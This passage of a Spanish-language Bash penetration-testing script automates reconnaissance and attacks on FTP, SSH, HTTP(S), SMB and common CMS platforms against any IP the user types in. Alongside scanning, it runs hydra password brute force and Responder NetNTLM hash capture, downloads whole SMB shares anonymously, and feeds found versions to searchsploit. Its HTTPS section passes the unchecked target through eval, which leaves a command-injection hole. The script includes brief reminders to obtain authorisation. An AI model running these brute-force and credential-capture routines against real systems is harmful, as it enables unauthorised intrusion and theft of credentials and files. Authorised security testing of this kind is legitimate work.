        # 3. Banner grabbing
        echo "Realizando banner grabbing..."
        nc -vn $ip_address 21 </dev/null >$results_dir/banner_grab.txt
        print_separator

        # 4. Enumeración de usuarios
        while true; do
            read -p "Introduce la ruta de la wordlist para enumeración de usuarios: " user_wordlist
            if [ -f "$user_wordlist" ]; then
                break
            else
                echo "El archivo no existe. Por favor, introduce una ruta válida."
            fi
        done

        echo "Realizando enumeración de usuarios..."
        hydra -L $user_wordlist -e nsr -M $ip_address ftp >$results_dir/user_enum.txt
        print_separator

        # 5. Ataque de fuerza bruta
        while true; do
            read -p "Introduce la ruta de la wordlist para el ataque de fuerza bruta (password): " pass_wordlist
            if [ -f "$pass_wordlist" ]; then
                break
            else
                echo "El archivo no existe. Por favor, introduce una ruta válida."
            fi
        done

        echo "Realizando ataque de fuerza bruta..."
        hydra -L $results_dir/user_enum.txt -P $pass_wordlist $ip_address ftp >$results_dir/brute_force.txt
        print_separator

        # 6. Enumeración con ftpmap
        echo "Realizando enumeración con ftpmap..."
        ftpmap -s $ip_address >$results_dir/ftpmap_enum.txt

        echo "Enumeración completa. Los resultados se han guardado en el directorio $results_dir"
        print_separator

    }

#--------------------------------------------------------------------------------------

# Apartado de enumeración del Servicio SSH(22)

#--------------------------------------------------------------------------------------

    function SEssh() {
        # Función para verificar si una herramienta está instalada
        check_tool() {
            if ! command -v $1 &>/dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálelo e intente de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool hydra
        check_tool sshscan

        # Solicitar la dirección IP
        read -p "Introduce la dirección IP del objetivo: " target_ip

        # Verificar si la IP es válida y si el servicio SSH está activo
        if ! ping -c 1 $target_ip &>/dev/null; then
            echo "Error: No se puede alcanzar la dirección IP $target_ip"
            exit 1
        fi

        if ! nmap -p22 $target_ip | grep -q "22/tcp open"; then
            echo "Error: El servicio SSH no está activo en $target_ip"
            exit 1
        fi

        # Crear directorio para almacenar resultados
        result_dir="ssh_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $result_dir

        # Función para imprimir separadores
        print_separator() {
            echo "----------------------------------------"
        }

        # 1. Escaneo de puertos y detección de versión con nmap
        echo "Realizando escaneo de puertos y detección de versión..."
        nmap -sV -p22 $target_ip >"$result_dir/nmap_version_scan.txt"
        print_separator

        # 2. Escaneo de SSH con scripts de nmap
        echo "Realizando escaneo de SSH con scripts de nmap..."
        nmap -p22 --script ssh* $target_ip >"$result_dir/nmap_ssh_scripts.txt"
        print_separator

        # 3. Banner grabbing
        echo "Realizando banner grabbing..."
        nc -v $target_ip 22 >"$result_dir/ssh_banner.txt"
        print_separator

        # 4. Enumeración de usuarios
        while true; do
            read -p "Introduce la ruta de la wordlist para enumeración de usuarios: " user_wordlist
            if [ -f "$user_wordlist" ]; then
                break
            else
                echo "Error: El archivo no existe. Por favor, introduce una ruta válida."
            fi
        done

        echo "Realizando enumeración de usuarios..."
        hydra -L $user_wordlist -e nsr -M $target_ip -t 4 ssh >"$result_dir/user_enum.txt"
        print_separator

        # 5. Ataque de fuerza bruta
        while true; do
            read -p "Introduce la ruta de la wordlist para el ataque de fuerza bruta: " pass_wordlist
            if [ -f "$pass_wordlist" ]; then
                break
            else
                echo "Error: El archivo no existe. Por favor, introduce una ruta válida."
            fi
        done

        echo "Realizando ataque de fuerza bruta..."
        hydra -L "$result_dir/user_enum.txt" -P $pass_wordlist $target_ip ssh >"$result_dir/brute_force.txt"
        print_separator

        # 6. Enumeración con sshscan
        echo "Realizando enumeración con sshscan..."
        sshscan $target_ip >"$result_dir/sshscan_results.txt"
        print_separator

        # 7. Análisis de claves SSH
        echo "Realizando análisis de claves SSH..."
        ssh-keyscan $target_ip >"$result_dir/ssh_keys.txt"
        ssh-audit $target_ip >"$result_dir/ssh_audit.txt"

        echo "Enumeración completa. Los resultados se encuentran en el directorio $result_dir"
        print_separator
    }

#--------------------------------------------------------------------------------------

# Apartado de enumeración del Servicio HTTP(80)

#--------------------------------------------------------------------------------------

    function SEhttp() {
        # Función para verificar si una herramienta está instalada
        check_tool() {
            if ! command -v $1 &>/dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálalo e inténtalo de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool whatweb
        check_tool curl
        check_tool wafw00f
        check_tool eyewitness

        # Solicitar la dirección IP
        read -p "Introduce la dirección IP del objetivo: " target_ip

        # Verificar si la IP es válida y si el servicio HTTP está activo
        if ! ping -c 1 $target_ip &>/dev/null; then
            echo "Error: No se puede alcanzar la dirección IP proporcionada."
            exit 1
        fi

        if ! nmap -p 80 $target_ip | grep -q "80/tcp open"; then
            echo "Error: El servicio HTTP no está activo en la dirección IP proporcionada."
            exit 1
        fi

        # Crear directorio para almacenar resultados
        results_dir="http_enumeration_results_${target_ip}"
        mkdir -p $results_dir

        # Función para imprimir separadores
        print_separator() {
            echo "----------------------------------------"
        }

        # 1. Escaneo de detección de versión del servicio con nmap
        echo "Realizando escaneo de detección de versión..."
        nmap -sV -p 80 $target_ip >"$results_dir/version_scan.txt"
        print_separator

        # 2. Escaneo con nmap del servicio HTTP con todos los scripts
        echo "Realizando escaneo con scripts de nmap..."
        nmap -p 80 --script="http-*" $target_ip >"$results_dir/http_scripts_scan.txt"
        print_separator

        # 3. Identificación de servicios web con whatweb
        echo "Identificando servicios web con whatweb..."
        whatweb $target_ip >"$results_dir/whatweb_results.txt"
        print_separator

        # 4. Identificación de servicios web con curl
        echo "Identificando servicios web con curl..."
        curl -I $target_ip >"$results_dir/curl_headers.txt"
        print_separator

        # 5. Detección de WAF
        echo "Detectando WAF..."
        wafw00f $target_ip >"$results_dir/waf_detection.txt"
        print_separator

        # 6. Captura de pantalla del sitio web
        echo "Capturando pantalla del sitio web..."
        eyewitness --web --single $target_ip --no-prompt -d "$results_dir/screenshots"
        print_separator

        # 7. Análisis de Robots.txt y Sitemap
        echo "Analizando Robots.txt y Sitemap..."
        curl -s $target_ip/robots.txt >"$results_dir/robots.txt"
        curl -s $target_ip/sitemap.xml >"$results_dir/sitemap.xml"
        print_separator

        echo "Enumeración completa. Los resultados se han guardado en el directorio $results_dir"
    }

#--------------------------------------------------------------------------------------

# Apartado de enumeración del Servicio HTTPS(443)

#--------------------------------------------------------------------------------------

    function SEhttps() {
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &>/dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálelo e inténtelo de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool openssl
        check_tool sslyze
        check_tool sslscan
        check_tool testssl.sh

        # Solicitar dirección IP
        read -p "Ingrese la dirección IP del objetivo: " target_ip

        # Verificar si la dirección IP es válida
        if ! ping -c 1 $target_ip &>/dev/null; then
            echo "Error: La dirección IP no es alcanzable."
            exit 1
        fi

        # Verificar si el servicio HTTPS está activo
        if ! nmap -p 443 $target_ip | grep -q "443/tcp open"; then
            echo "Error: El servicio HTTPS no está activo en la dirección IP proporcionada."
            exit 1
        fi

        # Crear directorio para almacenar resultados
        timestamp=$(date +"%Y%m%d_%H%M%S")
        results_dir="https_enum_results_${timestamp}"
        mkdir $results_dir

        # Función para ejecutar comandos y guardar resultados
        run_command() {
            echo "Ejecutando: $1"
            eval $1 >"$results_dir/$2" 2>&1
            echo "Resultados guardados en $results_dir/$2"
        }

        # Función para imprimir separadores
        print_separator() {
            echo "----------------------------------------"
        }

        # 1. Escaneo de detección de versión del servicio con nmap
        run_command "nmap -sV -p 443 $target_ip" "nmap_version_scan.txt"
        print_separator

        # 2. Escaneo con nmap del servicio HTTPS con todos los scripts relacionados
        run_command "nmap -p 443 --script ssl-* $target_ip" "nmap_ssl_scripts_scan.txt"
        print_separator

        # 3. OpenSSL - obtener certificado
        run_command "openssl s_client -connect ${target_ip}:443 </dev/null" "openssl_certificate.txt"
        print_separator

        # 4. OpenSSL - mostrar cifrados admitidos
        run_command "openssl s_client -connect ${target_ip}:443 -cipher ALL </dev/null" "openssl_ciphers.txt"
        print_separator

        # 5. Escaneo avanzado con SSLyze, incluyendo comprobaciones de vulnerabilidades conocidas
        run_command "sslyze ${target_ip}:443 --heartbleed --robot --fallback --compression --openssl_ccs --early_data --http_headers" "sslyze_scan.txt"
        print_separator

        # 6. Escaneo avanzado con SSLScan
        run_command "sslscan ${target_ip}" "sslscan_basic.txt"
        print_separator

        # 7. SSLScan - mostrar cifrados admitidos
        run_command "sslscan --show-ciphers ${target_ip}" "sslscan_ciphers.txt"
        print_separator

        # 8. Escaneo completo y avanzado con testssl.sh, incluyendo comprobaciones de vulnerabilidades conocidas
        run_command "testssl.sh --vulnerable --each-cipher --all --server-defaults --server-preference --headers --ip=one ${target_ip}:443" "testssl_scan.txt"
        print_separator

        echo "Enumeración HTTPS completa. Todos los resultados se han guardado en el directorio $results_dir"
    }

#--------------------------------------------------------------------------------------

# Apartado de enumeración del Servicio SMB(139,445)

#--------------------------------------------------------------------------------------

    function SEsmb() {
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &>/dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálalo e intenta de nuevo."
                exit 1
            fi
        }

        # Función para verificar la conectividad IP y el servicio SMB
        check_ip_and_smb() {
            if ! ping -c 1 $1 &>/dev/null; then
                echo "Error: No se puede alcanzar la IP $1"
                exit 1
            fi
            if ! nc -z $1 445 &>/dev/null; then
                echo "Error: El servicio SMB no está activo en $1"
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool smbmap
        check_tool smbclient
        check_tool crackmapexec
        check_tool rpcclient
        check_tool enum4linux
        check_tool responder

        # Solicitar dirección IP
        read -p "Introduce la dirección IP objetivo: " target_ip

        # Verificar IP y servicio SMB
        check_ip_and_smb $target_ip

        # Crear directorio para resultados
        results_dir="smb_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $results_dir

        # Función para imprimir separadores
        print_separator() {
            echo "----------------------------------------"
        }

        # 1. Escaneo de detección de versión con nmap
        echo "Realizando escaneo de detección de versión con nmap..."
        nmap -sV -p 139,445 $target_ip >$results_dir/nmap_version_scan.txt
        print_separator

        # 2. Escaneo con scripts SMB de nmap
        echo "Realizando escaneo con scripts SMB de nmap..."
        nmap -p 139,445 --script smb-* $target_ip >$results_dir/nmap_smb_scripts.txt
        print_separator

        # 3. Enumeración con Smbmap
        echo "Enumeración con Smbmap"
        PS3="Selecciona una opción de enumeración con Smbmap: "
        options=("Enumeración de recursos compartidos" "Enumerar un recurso específico" "Enumerar con más detalles" "Enumeración completa y avanzada" "Saltar")
        select opt in "${options[@]}"; do
            case $opt in
            "Enumeración de recursos compartidos")
                smbmap -H $target_ip >$results_dir/smbmap_shares.txt
                break
                ;;
            "Enumerar un recurso específico")
                read -p "Introduce el nombre del recurso: " share_name
                smbmap -H $target_ip -s $share_name >$results_dir/smbmap_specific_share.txt
                break
                ;;
            "Enumerar con más detalles")
                smbmap -H $target_ip -R --depth 5 >$results_dir/smbmap_detailed.txt
                break
                ;;
            "Enumeración completa y avanzada")
                read -p "¿Tienes credenciales? (s/n): " has_creds
                if [[ $has_creds == "s" ]]; then
                    read -p "Usuario: " smb_user
                    read -sp "Contraseña: " smb_pass
                    echo
                    smbmap -H $target_ip -u $smb_user -p $smb_pass -R --depth 5 >$results_dir/smbmap_advanced_creds.txt
                else
                    smbmap -H $target_ip -R --depth 5 >$results_dir/smbmap_advanced_no_creds.txt
                fi
                break
                ;;
            "Saltar")
                break
                ;;
            *) echo "Opción inválida" ;;
            esac
        done
        print_separator

        # 4. Exploración con Smbclient
        echo "Listando recursos compartidos con Smbclient..."
        smbclient -L //$target_ip -N >$results_dir/smbclient_shares.txt
        echo "Para conectarte a un recurso: smbclient //$target_ip/[recurso] -U [usuario]"
        echo "Para ejecutar comandos remotos: smbclient //$target_ip/[recurso] -U [usuario] -c '[comando]'"
        print_separator

        # 5. Búsqueda manual de archivos sensibles con Smbclient
        read -p "¿Quieres buscar archivos sensibles con Smbclient? (s/n): " search_files
        if [[ $search_files == "s" ]]; then
            read -p "Introduce el nombre del recurso compartido: " share_name
            smbclient //$target_ip/$share_name -N -c 'recurse ON; prompt OFF; mget *' >$results_dir/smbclient_files.txt
        fi
        print_separator

        # 6. Enumeración Avanzada con CrackMapExec (CME)
        echo "Enumeración con CrackMapExec"
        PS3="Selecciona una opción de enumeración con CrackMapExec: "
        options=("Escaneo básico de red" "Enumeración de Política de Contraseñas" "Búsqueda de archivos sensibles" "Enumerar recursos compartidos" "Enumeración completa y avanzada" "Saltar")
        select opt in "${options[@]}"; do
            case $opt in
            "Escaneo básico de red")
                crackmapexec smb $target_ip >$results_dir/cme_basic_scan.txt
                break
                ;;
            "Enumeración de Política de Contraseñas")
                crackmapexec smb $target_ip --pass-pol >$results_dir/cme_password_policy.txt
                break
                ;;
            "Búsqueda de archivos sensibles")
                crackmapexec smb $target_ip -M spider_plus >$results_dir/cme_sensitive_files.txt
                break
                ;;
            "Enumerar recursos compartidos")
                crackmapexec smb $target_ip --shares >$results_dir/cme_shares.txt
                break
                ;;
            "Enumeración completa y avanzada")
                read -p "¿Tienes credenciales? (s/n): " has_creds
                if [[ $has_creds == "s" ]]; then
                    read -p "Usuario: " cme_user
                    read -p "Contraseña: " cme_pass
                    crackmapexec smb $target_ip -u $cme_user -p $cme_pass --shares --pass-pol -M spider_plus >$results_dir/cme_advanced_creds.txt
                else
                    crackmapexec smb $target_ip --shares --pass-pol -M spider_plus >$results_dir/cme_advanced_no_creds.txt
                fi
                break
                ;;
            "Saltar")
                break
                ;;
            *) echo "Opción inválida" ;;
            esac
        done
        print_separator

        # 7. Enumeración de usuarios y grupos con rpcclient
        echo "Enumeración con rpcclient"
        PS3="Selecciona una opción de enumeración con rpcclient: "
        options=("Enumeración de usuarios" "Enumeración de grupos" "Obtener información de usuario específico" "Saltar")
        select opt in "${options[@]}"; do
            case $opt in
            "Enumeración de usuarios")
                rpcclient -U "" $target_ip -c "enumdomusers" >$results_dir/rpcclient_users.txt
                break
                ;;
            "Enumeración de grupos")
                rpcclient -U "" $target_ip -c "enumdomgroups" >$results_dir/rpcclient_groups.txt
                break
                ;;
            "Obtener información de usuario específico")
                read -p "Introduce el nombre de usuario: " specific_user
                rpcclient -U "" $target_ip -c "queryuser $specific_user" >$results_dir/rpcclient_specific_user.txt
                break
                ;;
            "Saltar")
                break
                ;;
            *) echo "Opción inválida" ;;
            esac
        done
        print_separator

        # 8. Enumeración de política de contraseñas con enum4linux
        echo "Enumerando política de contraseñas con enum4linux..."
        enum4linux -P $target_ip >$results_dir/enum4linux_password_policy.txt
        print_separator

        # 9.Captura de Hashes NetNTLM con responder
        read -p "¿Quieres iniciar la captura de Hashes NetNTLM con Responder? (s/n): " start_responder
        if [[ $start_responder == "s" ]]; then
            read -p "Introduce la interfaz de red (ej. eth0): " network_interface
            echo "Iniciando Responder... (Presiona Ctrl+C para detener)"
            sudo responder -I $network_interface -wrfv
        fi
        print_separator

        echo "Enumeración completa. Los resultados se encuentran en el directorio $results_dir"
    }

#--------------------------------------------------------------------------------------

# Apartado de Redireccionamiento de funciones de la Enumeración de Servicios

#--------------------------------------------------------------------------------------

    if [ $option4 -eq 1 ]; then
        SEftp
    elif [ $option4 -eq 2 ]; then
        SEssh
    elif [ $option4 -eq 3 ]; then
        SEhttp
    elif [ $option4 -eq 4 ]; then
        SEhttps
    elif [ $option4 -eq 5 ]; then
        SEsmb
    elif [ $option4 -eq 99 ]; then
        index
    else
        echo -e "\n${redColour}[!] El parámetro proporcionado no es válido${endColour}"
    fi
}

#---------------------------------------------------------------------------------------------------------------------------------
#---------------------------------------------------------------------------------------------------------------------------------


#--------------------------------------------------------------------------------------

# Apartado de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

function CMS-Enum() {
    echo -e "\n${yellowColour}[+]${endColour}${greyColour} Uso:${endColour}"
    echo -e "\t${purpleColour}1)${endColour}${greyColour} Wordpress${endColour}"
    echo -e "\t${purpleColour}2)${endColour}${greyColour} Joomla${endColour}"
    echo -e "\t${purpleColour}3)${endColour}${greyColour} Drupal${endColour}"
    echo -e "\t${purpleColour}4)${endColour}${greyColour} Magento${endColour}"
    echo -e "\t${purpleColour}99)${endColour}${greyColour} Volver${endColour}"
    echo -n -e "\n${yellowColour}[+]${endColour}${greyColour} Elige el gestor de contenido a enumerar: ${endColour}"
    read option5

#--------------------------------------------------------------------------------------

# Apartado de Wordpress de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

    function wordpress_enum(){
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &> /dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálalo e intenta de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool wpscan
        check_tool curl
        check_tool searchsploit

        # Solicitar la dirección IP
        read -p "Introduce la dirección IP del sitio WordPress: " ip_address

        # Verificar si la IP es válida y responde
        if ! ping -c 1 $ip_address &> /dev/null; then
            echo "Error: La dirección IP no responde. Verifica la IP e intenta de nuevo."
            exit 1
        fi

        # Crear directorio para resultados
        results_dir="wordpress_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $results_dir

        # Verificar si WordPress está activo
        if ! curl -s "http://$ip_address" | grep -qi "wp-content"; then
            echo "Error: No se detectó WordPress en la IP proporcionada."
            exit 1
        fi

        echo "Iniciando enumeración de WordPress en $ip_address..."

        # Configuración de WPScan
        read -p "¿Deseas realizar un escaneo agresivo con WPScan? (s/n): " aggressive_scan
        if [[ $aggressive_scan =~ ^[Ss]$ ]]; then
            wpscan_options="--enumerate all"
        else
            wpscan_options="--enumerate vp,vt,tt,cb,dbe,u,m"
        fi

        read -p "¿Tienes un API token para WPScan? (s/n): " has_api_token
        if [[ $has_api_token =~ ^[Ss]$ ]]; then
            read -p "Introduce tu API token de WPScan: " api_token
            wpscan_options="$wpscan_options --api-token $api_token"
        fi

        # Enumeración con WPScan
        echo "Realizando enumeración con WPScan..."
        wpscan --url "http://$ip_address" $wpscan_options > "$results_dir/wpscan_results.txt"

        # Escaneo adicional con la base de datos de vulnerabilidades si se proporcionó un API token
        if [[ $has_api_token =~ ^[Ss]$ ]]; then
            echo "Realizando escaneo de vulnerabilidades con WPScan..."
            wpscan --url "http://$ip_address" --api-token $api_token --plugins-detection aggressive --plugins-version-detection aggressive > "$results_dir/wpscan_vulnerabilities.txt"
        fi

        # Enumerar directorios
        echo "Enumerando directorios..."
        curl -s "http://$ip_address/robots.txt" > "$results_dir/robots.txt"
        curl -s "http://$ip_address/wp-includes/" > "$results_dir/wp_includes.html"
        curl -s "http://$ip_address/wp-content/plugins/" > "$results_dir/wp_plugins.html"
        curl -s "http://$ip_address/wp-content/themes/" > "$results_dir/wp_themes.html"

        # Verificar xmlrpc.php y realizar fuzzing de métodos si existe
        echo "Verificando xmlrpc.php..."
        if curl -s -I "http://$ip_address/xmlrpc.php" | grep -q "200 OK"; then
            echo "xmlrpc.php encontrado. Realizando fuzzing de métodos..."
            curl -s "http://$ip_address/xmlrpc.php" > "$results_dir/xmlrpc.txt"

            # Lista de métodos comunes de XML-RPC para el fuzzing
            methods=(
                "system.listMethods"
                "wp.getUsersBlogs"
                "wp.getCategories"
                "metaWeblog.getRecentPosts"
                "wp.getTags"
                "wp.suggestCategories"
                "wp.getCommentCount"
                "wp.getPostStatusList"
                "wp.getPageList"
                "wp.getAuthors"
                "pingback.ping"
            )

            echo "Realizando fuzzing de métodos XML-RPC..."
            for method in "${methods[@]}"; do
                echo "Probando método: $method"
                response=$(curl -s -X POST "http://$ip_address/xmlrpc.php" \
                    -H "Content-Type: text/xml" \
                    -d "<?xml version=\"1.0\" encoding=\"utf-8\"?><methodCall><methodName>$method</methodName><params></params></methodCall>")
                echo "Respuesta para $method:" >> "$results_dir/xmlrpc_fuzzing.txt"
                echo "$response" >> "$results_dir/xmlrpc_fuzzing.txt"
                echo "--------------------" >> "$results_dir/xmlrpc_fuzzing.txt"
            done
        else
            echo "xmlrpc.php no encontrado o no accesible."
        fi

        # Verificar wp-json API
        echo "Verificando wp-json API..."
        curl -s "http://$ip_address/wp-json/wp/v2/users" > "$results_dir/wp_json_users.json"

        # Identificar versiones y buscar exploits
        echo "Identificando versiones y buscando exploits..."
        {
            echo "Versiones identificadas y posibles exploits:"
            echo "----------------------------------------"
            
            # Extraer versión de WordPress
            wp_version=$(grep "WordPress version" "$results_dir/wpscan_results.txt" | awk '{print $NF}')
            if [ ! -z "$wp_version" ]; then
                echo "WordPress versión $wp_version"
                searchsploit "wordpress $wp_version"
            fi
            
            # Extraer y buscar exploits para todos los plugins
            echo "Buscando exploits para plugins:"
            grep "\[+\] Name:" "$results_dir/wpscan_results.txt" | awk -F': ' '{print $2}' | while read -r plugin_name; do
                echo "Plugin: $plugin_name"
                searchsploit "wordpress plugin $plugin_name"
            done
            
            # Extraer y buscar exploits para todos los temas
            echo "Buscando exploits para temas:"
            grep "Theme Name:" "$results_dir/wpscan_results.txt" | awk -F': ' '{print $2}' | while read -r theme_name; do
                echo "Tema: $theme_name"
                searchsploit "wordpress theme $theme_name"
            done
        } > "$results_dir/version_exploits.txt"

        echo "Enumeración completa. Los resultados se encuentran en el directorio: $results_dir"
    }

#--------------------------------------------------------------------------------------

# Apartado de Joomla de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

    function joomla_enum() {
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &> /dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálalo e intenta de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool curl
        check_tool joomscan
        check_tool searchsploit

        # Solicitar la dirección IP o URL
        read -p "Introduce la dirección IP o URL del objetivo (sin http/https): " target

        # Verificar si el objetivo es accesible
        if ! curl -s "http://$target" &> /dev/null; then
            echo "Error: El objetivo proporcionado no responde."
            exit 1
        fi

        # Crear directorio para los resultados
        results_dir="joomla_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $results_dir

        # Verificar si Joomla está activo
        if ! curl -s "http://$target" | grep -qi "joomla"; then
            echo "Error: No se detectó Joomla en la dirección proporcionada."
            rm -rf $results_dir
            exit 1
        fi

        echo "Iniciando enumeración avanzada de Joomla en $target..."

        # 1. Reconocimiento Pasivo
        echo "Realizando reconocimiento pasivo..."
        curl -s "http://$target" | grep -i 'meta name="generator"' > "$results_dir/joomla_meta.txt"
        curl -s "http://$target/administrator" -o "$results_dir/admin_page.html"
        curl -s "http://$target/robots.txt" -o "$results_dir/robots.txt"

        # 2. Escaneo Activo
        echo "Realizando escaneo activo..."
        # Joomscan
        joomscan -u "http://$target" --ep 3 -ec -a > "$results_dir/joomscan_results.txt"

        # Nmap (con scripts adicionales de Joomla si existen)
        nmap -sV --script "http-joomla-brute,http-robots.txt,http-sitemap-generator,http-joomla*" "$target" -oN "$results_dir/nmap_joomla_scan.txt"

        # 3. Enumeración Manual
        echo "Realizando enumeración manual..."
        curl -s "http://$target/README.txt" -o "$results_dir/readme.txt"
        curl -s "http://$target/administrator/manifests/files/joomla.xml" -o "$results_dir/joomla_manifest.xml"
        curl -s "http://$target/language/en-GB/en-GB.xml" -o "$results_dir/language_version.xml"

        # 4. Enumeración de Usuarios
        echo "Enumerando usuarios..."
        curl -s "http://$target/index.php?option=com_users" -o "$results_dir/users_page.html"
        curl -s "http://$target/index.php?option=com_content&view=article&id=1" -o "$results_dir/author_page.html"

        # 5. Búsqueda en searchsploit
        echo "Buscando vulnerabilidades conocidas con searchsploit..."
        joomla_version=$(grep -i "version" "$results_dir"/* | grep -oP '(\d+\.)+\d+' | sort -u)
        if [ ! -z "$joomla_version" ]; then
            for version in $joomla_version; do
                searchsploit "Joomla $version" > "$results_dir/searchsploit_results_$version.txt"
            done
        else
            searchsploit "Joomla" > "$results_dir/searchsploit_results_general.txt"
        fi

        # 6. Post-Enumeración
        echo "Realizando comprobaciones post-enumeración..."
        curl -s "http://$target/administrator/index.php" -o "$results_dir/admin_login_page.html"

        echo "Enumeración completa. Los resultados se han guardado en el directorio $results_dir"

        # Resumen de los hallazgos
        echo "Resumen de los hallazgos:"
        echo "========================="
        grep -i "version" "$results_dir"/* 2>/dev/null
        grep -i "vulnerability" "$results_dir"/* 2>/dev/null
        grep -i "joomla" "$results_dir"/* 2>/dev/null

        echo "Por favor, revisa los archivos en $results_dir para obtener información detallada."
        echo "Recuerda siempre obtener la autorización adecuada antes de realizar pruebas en cualquier sitio web o aplicación."
    }

#--------------------------------------------------------------------------------------

# Apartado de Drupal de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

    function drupal_enum() {
        # Función para verificar la existencia de una herramienta
        check_tool() {
            if ! command -v $1 &> /dev/null; then
                echo "Error: $1 no está instalado. Por favor, instálalo e intenta de nuevo."
                exit 1
            fi
        }

        # Verificar herramientas necesarias
        check_tool nmap
        check_tool cmsmap
        check_tool curl
        check_tool droopescan
        check_tool searchsploit

        # Solicitar la dirección IP
        read -p "Introduce la dirección IP del objetivo: " target_ip

        # Crear directorio para resultados
        results_dir="drupal_enum_results_$(date +%Y%m%d_%H%M%S)"
        mkdir $results_dir

        # Reconocimiento inicial
        echo "Realizando reconocimiento inicial..."
        curl -s "http://$target_ip/CHANGELOG.txt" > "$results_dir/changelog.txt"
        curl -s "http://$target_ip" | grep -i drupal > "$results_dir/drupal_references.txt"
        curl -s "http://$target_ip/node" > "$results_dir/node_check.txt"
        curl -s "http://$target_ip/user" > "$results_dir/user_check.txt"
        curl -s "http://$target_ip/admin" > "$results_dir/admin_check.txt"

        # Enumeración con Droopescan
        echo "Ejecutando Droopescan..."
        droopescan scan drupal -u "http://$target_ip" -t 10 > "$results_dir/droopescan_results.txt"

        # Enumeración Manual
        echo "Realizando enumeración manual..."
        curl -s "http://$target_ip/CHANGELOG.txt" | grep -i 'drupal' > "$results_dir/drupal_version.txt"
        curl -s "http://$target_ip" | grep -i 'drupal [0-9]' >> "$results_dir/drupal_version.txt"
        curl -s "http://$target_ip/themes" > "$results_dir/themes_directory.txt"
        curl -s "http://$target_ip/modules" > "$results_dir/modules_directory.txt"

        # CMSmap (escaneo completo)
        echo "Ejecutando CMSmap..."
        cmsmap -f D -F -d -t "http://$target_ip" > "$results_dir/cmsmap_results.txt"

        # Nmap (versiones y scripts relacionados con Drupal)
        echo "Ejecutando Nmap..."
        nmap -sV --script "http-drupal-*" $target_ip -oN "$results_dir/nmap_drupal_scan.txt"

        # Búsqueda con searchsploit
        echo "Buscando exploits con searchsploit..."
        grep -h -E "Drupal|Version" "$results_dir"/* | sort -u | while read -r line; do
            searchsploit "$line" >> "$results_dir/searchsploit_results.txt"
        done

        # Técnicas Avanzadas
        echo "Realizando comprobaciones avanzadas..."
        curl -s "http://$target_ip/rest" > "$results_dir/rest_api_check.txt"
        curl -s "http://$target_ip/jsonapi" > "$results_dir/jsonapi_check.txt"
        curl -s "http://$target_ip/sites/default/settings.php" > "$results_dir/settings_php_check.txt"
        curl -s "http://$target_ip/sites/default/services.yml" > "$results_dir/services_yml_check.txt"

        echo "Enumeración completada. Los resultados se encuentran en el directorio $results_dir"
        echo "Recuerda revisar manualmente los resultados y realizar pruebas adicionales según sea necesario."
        echo "Siempre obtén los permisos necesarios antes de realizar pruebas en sistemas que no te pertenezcan."
    }

#--------------------------------------------------------------------------------------

# Apartado de Magento de Enumeración de Gestores de Contenido

#--------------------------------------------------------------------------------------

    function magento_enum() {
        # Verificar herramientas necesarias
        for tool in nmap curl php magescan; do
            if ! command -v $tool &> /dev/null; then
                echo "Error: $tool no está instalado. Por favor, instálelo e intente de nuevo."
                exit 1
            fi
        done

        # Solicitar la dirección URL del objetivo
        read -p "Introduce la URL del objetivo Magento (ejemplo: https://example.com): " target_url

        # Verificar si la URL es válida y accesible
        if ! curl --output /dev/null --silent --head --fail "$target_url"; then
            echo "Error: La URL $target_url no es accesible."
            exit 1
        fi

        # Crear directorio para resultados
        result_dir="magento_enum_$(date +%Y%m%d_%H%M%S)"
        mkdir $result_dir

        # Reconocimiento inicial
        echo "Realizando reconocimiento inicial..."
        curl -s "$target_url" | grep -i "magento/" > "$result_dir/magento_version.txt"
        curl -s "$target_url/RELEASE_NOTES.txt" > "$result_dir/release_notes.txt"
        curl -s "$target_url/README.md" > "$result_dir/readme.txt"
        curl -s "$target_url/composer.json" | grep -i "version" > "$result_dir/composer_version.txt"
        curl -s "$target_url/magento_version" > "$result_dir/magento_version_file.txt"

        # Escaneo con nmap
        echo "Realizando escaneo con nmap..."
        nmap -sV --script=http-enum,http-headers,http-methods,http-magento-paths,http-title,http-robots.txt "$target_url" > "$result_dir/nmap_magento_scan.txt"

        # Enumeración de directorios y archivos sensibles
        echo "Enumerando directorios y archivos sensibles..."
        sensitive_paths=(
            "/app/etc/local.xml" "/app/etc/config.xml" "/admin" "/downloader" "/shell"
            "/app" "/lib" "/media" "/var" "/includes" "/skin" "/js" "/errors"
            "/api.php" "/cron.php" "/get.php" "/install.php" "/index.php"
            "/app/etc/enterprise.xml" "/app/etc/local.xml.additional" "/app/etc/local.xml.template"
            "/downloader/index.php" "/downloader/lib" "/rss" "/customer/account/create"
        )

        for path in "${sensitive_paths[@]}"; do
            status=$(curl -s -o /dev/null -w "%{http_code}" "$target_url$path")
            echo "$path: $status" >> "$result_dir/sensitive_paths.txt"
        done

        # Enumeración de usuarios
        echo "Enumerando usuarios y paneles de administración..."
        admin_paths=("/admin" "/backend" "/control" "/manage" "/administration" "/adm")

        for path in "${admin_paths[@]}"; do
            status=$(curl -s -o /dev/null -w "%{http_code}" "$target_url$path")
